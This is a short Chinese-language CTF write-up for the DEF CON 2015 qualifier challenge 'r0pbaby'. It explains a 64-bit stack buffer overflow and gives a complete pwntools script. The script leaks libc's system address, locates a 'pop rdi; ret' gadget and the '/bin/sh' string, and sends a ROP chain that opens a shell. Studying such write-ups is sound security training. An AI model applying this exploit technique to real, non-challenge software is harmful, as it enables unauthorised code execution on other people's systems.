---
title: Defcon-2015-Qualifier-r0pbaby
date: 2018-03-17 18:11:32
tags: pwn
---
64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找   
   
buf的大小是8，会造成缓冲区溢出   
解题思路  
1.找到一个gadget RDI  
2.找到 `/bin/sh`地址   
3.找到 `system` 函数地址  
查找 gadget   
`ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"`  
查找 /bin/sh 字符串  
`strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"`


```
from pwn import *
elf = ELF('r0pbaby')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process('./r0pbaby')
sh = next(libc.search('/bin/sh'))
sys_offset = libc.symbols['system']
rdi_offset = 0x000000000002144f

def getFun(fun):
    io.recvuntil("4) Exit\n:")
    io.sendline('2')
    io.recvuntil("Enter symbol:")
    io.sendline(fun)
    msg = io.recvuntil("4) Exit\n: ")
    offset = msg.find(":")
    offset2 = msg.find("\n")
    addr = msg[offset+2:offset2]
    return long(addr,16)

sys_addr = getFun('system') 
sh_addr = sys_addr-sys_offset + sh 
rdi_addr = sys_addr - sys_offset+rdi_offset

payload = 'a'*8+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)
io.recv()
io.sendline('3')
io.recv()
io.sendline(str(len(payload)))
io.sendline(payload)
io.recvuntil("Bad choice.\n")   
io.interactive()
```
总结：简单的调用 system + “bin/sh” 通过寄存器 gadget “pop rdi;ret “传参
